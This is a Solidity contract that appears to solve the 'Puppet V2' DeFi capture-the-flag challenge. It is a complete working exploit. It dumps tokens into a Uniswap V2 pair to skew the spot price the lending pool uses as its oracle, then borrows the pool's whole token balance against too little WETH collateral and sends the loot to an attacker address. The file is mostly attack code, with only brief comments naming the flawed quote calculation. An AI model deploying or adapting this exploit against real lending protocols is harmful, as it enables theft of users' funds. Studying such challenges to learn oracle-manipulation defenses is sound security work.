// SPDX-License-Identifier: MIT
pragma solidity = 0.6.6;

import "./PuppetV2Pool.sol";

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/libraries/SafeMath.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";


//WETH9.sol only compiles with sol^0.7.0 so add minimalisitc interface here
interface WETH {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function deposit() external payable;
}


contract PuppetV2Exploit{

    using SafeMath for uint256;

    IERC20 public immutable token;
    WETH public immutable wethToken;
    PuppetV2Pool public puppetPool;
    address public attacker;
    address public uniswapFactoryAddress;
    IUniswapV2Router02 public uniswapRouter;

    constructor (address tokenAddress, address puppetPoolAddress, address _attacker, address wethAddress, address _uniswapFactoryAddress, address _uniswapRouterAddress) public {
        token = IERC20(tokenAddress);
        wethToken = WETH(wethAddress);
        puppetPool = PuppetV2Pool(puppetPoolAddress);
        attacker = _attacker;
        uniswapFactoryAddress = _uniswapFactoryAddress;
        uniswapRouter = IUniswapV2Router02(_uniswapRouterAddress);
    }

    // Pretty much the same as last challenge, the quote calculation is still flawed in the same way (and now we have to have 3x the Oracle quote instead of 2x)
    // Challenge was still useful in order to learn a bit about how UniswapV2 does things differently
    function pwn(uint256 tokenBalanceToTransfer) public payable{
        //Get tokens and approve transfer to uniswap
        require(token.transferFrom(attacker, address(this), tokenBalanceToTransfer), "Could not get all the tokens!");

        //Create path (in this case just the direct pair) of tokens to trade for making the sell-call to the router
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(wethToken);

        require(token.approve(address(uniswapRouter), tokenBalanceToTransfer));

        //Create Imbalance in the pair by selling all our tokens to it
        uniswapRouter.swapExactTokensForETH(tokenBalanceToTransfer, 0, path, address(this), block.timestamp + 60);

        //Transform eth-balance to WETH
        wethToken.deposit{value: address(this).balance}();
        
        //calculate how many tokens we can borrow with given funds
        uint256 currentMaxBorrow = calculateMaxBorrow();
        uint256 wethToApprove = wethToken.balanceOf(address(this));
        
        //Don't "over-drain" the pool, else we revert
        if(currentMaxBorrow > token.balanceOf(address(puppetPool))){
            currentMaxBorrow = token.balanceOf(address(puppetPool));
            wethToApprove = puppetPool.calculateDepositOfWETHRequired(currentMaxBorrow);
        }
        
        //Approve the WETH and borrow the tokens
        wethToken.approve(address(puppetPool), wethToApprove);
        puppetPool.borrow(currentMaxBorrow);
        
        //transfer back to attacker-address
        token.transfer(attacker, token.balanceOf(address(this)));
        wethToken.transfer(attacker, wethToken.balanceOf(address(this)));
    }


    //      required = amount.mul(10 ** 18).mul(reservesWETH) / reservesToken.mul(3) / (10 ** 18)
    // <=>  required.mul(10 ** 18 ) / 3 * reservesToken / reservesWETH / 10 ** 18 = amount
    function calculateMaxBorrow() private returns(uint256){
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(
            uniswapFactoryAddress, address(wethToken), address(token)
        );
        uint256 amount = wethToken.balanceOf(address(this)).mul(10 ** 18 ) / 3 * reservesToken / reservesWETH / (10 ** 18);
        return amount;
    }

    receive() external payable{}
}
